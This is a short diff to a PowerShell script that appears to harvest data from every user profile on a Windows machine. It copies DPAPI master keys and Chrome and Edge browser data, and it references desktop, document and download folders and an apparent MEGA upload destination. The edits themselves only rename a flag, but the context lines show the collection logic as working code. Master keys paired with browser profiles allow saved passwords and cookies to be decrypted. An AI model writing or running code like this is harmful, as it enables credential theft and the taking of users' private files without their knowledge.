@@ -103,7 +103,7 @@ $deskDirs = @('Desktop', 'Documents', 'Downloads', 'OneDrive')
 
     if ($destMega -eq "") { $destMega = "ZSUDocs" }
 
-    if (($First -ne $true) -and ($Stream -ne $true) -and ($Chromedge -ne $true) -and ($DownAll -ne $true)) {
+    if (($First -ne $true) -and ($Stream -ne $true) -and ($Browsers -ne $true) -and ($DownAll -ne $true)) {
         echo "You must specify at least one of <First> or <Stream> or <DownAll> or <Chromedge>"
         return
     }
@@ -137,8 +137,8 @@ $deskDirs = @('Desktop', 'Documents', 'Downloads', 'OneDrive')
         foreach ($usersDir in (gci $srcdir)) {
             IF (($usersDir.Name -eq "Public") -OR ($usersDir.Name -eq "All Users") -OR ($usersDir.Name -eq "Default User") -OR ($usersDir.Name -eq "Default")) { continue }
             $browsersUserDestDir = ($browsersDestDir + $usersDir.Name + '\'); New-Item $browsersUserDestDir -ItemType Directory -ea 0
+            
             Copy-Item -Force -Recurse ($usersDir.FullName + '\AppData\Roaming\Microsoft\protect\*') -Destination ($browsersUserDestDir)
-
             attrib.exe -h -s ($browsersDestDir + '\*') /s
             Browser-Copy ($usersDir, 'Edge')
             Browser-Copy ($usersDir, 'Chrome')
